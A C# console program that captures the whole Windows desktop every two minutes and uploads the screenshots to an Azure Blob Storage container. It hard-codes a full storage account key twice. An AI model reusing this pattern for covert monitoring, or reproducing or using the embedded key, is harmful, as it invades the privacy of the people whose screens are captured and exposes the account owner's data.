using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Azure.Storage;
using Microsoft.Azure.Storage.Blob;

class Program
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    [DllImport("gdi32.dll")]
    private static extern int DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteDC(IntPtr hdc);

    static void Main(string[] args)
    {
        string storageConnectionString = "DefaultEndpointsProtocol=https;AccountName=ahcctvimages;AccountKey=vOE2XMaJi67j+opXhfbPu73GTa48l9dgIF0piuCcslc9t4Vwe3D7UcPQ7y38iwQjbGSsuCHzTWs9+AStQQ1jfw==;EndpointSuffix=core.windows.net";
        string containerName = "ahcctvimages";

        // Create a timer to capture screenshots every 2 minutes
        Timer timer = new Timer(CaptureAndUploadScreenshot, null, TimeSpan.Zero, TimeSpan.FromMinutes(2));

        // Keep the application running
        Console.ReadLine();
    }

    static void CaptureAndUploadScreenshot(object state)
    {
        string storageConnectionString = "DefaultEndpointsProtocol=https;AccountName=ahcctvimages;AccountKey=vOE2XMaJi67j+opXhfbPu73GTa48l9dgIF0piuCcslc9t4Vwe3D7UcPQ7y38iwQjbGSsuCHzTWs9+AStQQ1jfw==;EndpointSuffix=core.windows.net";
        string containerName = "ahcctvimages";

        // Capture screenshot
        using (Bitmap bitmap = CaptureScreen())
        {
            // Upload screenshot to Azure Blob Storage
            CloudStorageAccount storageAccount = CloudStorageAccount.Parse(storageConnectionString);
            CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(containerName);
            container.CreateIfNotExists();

            string screenshotName = $"screenshot_{DateTime.Now:yyyyMMddHHmmss}.png";
            CloudBlockBlob blockBlob = container.GetBlockBlobReference(screenshotName);

            using (MemoryStream memoryStream = new MemoryStream())
            {
                bitmap.Save(memoryStream, ImageFormat.Png);
                memoryStream.Position = 0;
                blockBlob.UploadFromStream(memoryStream);
            }

            Console.WriteLine($"Screenshot uploaded: {screenshotName}");
        }
    }

    static Bitmap CaptureScreen()
    {
        IntPtr desktopWindowPtr = GetDesktopWindow();
        IntPtr desktopDC = GetWindowDC(desktopWindowPtr);
        IntPtr compatibleDC = CreateCompatibleDC(desktopDC);

        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        IntPtr compatibleBitmap = CreateCompatibleBitmap(desktopDC, width, height);
        IntPtr oldBitmap = SelectObject(compatibleDC, compatibleBitmap);

        BitBlt(compatibleDC, 0, 0, width, height, desktopDC, 0, 0, 0x00CC0020);

        Bitmap bitmap = Image.FromHbitmap(compatibleBitmap);

        SelectObject(compatibleDC, oldBitmap);
        DeleteObject(compatibleBitmap);
        ReleaseDC(IntPtr.Zero, desktopDC);
        DeleteDC(compatibleDC);

        return bitmap;
    }

    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
}
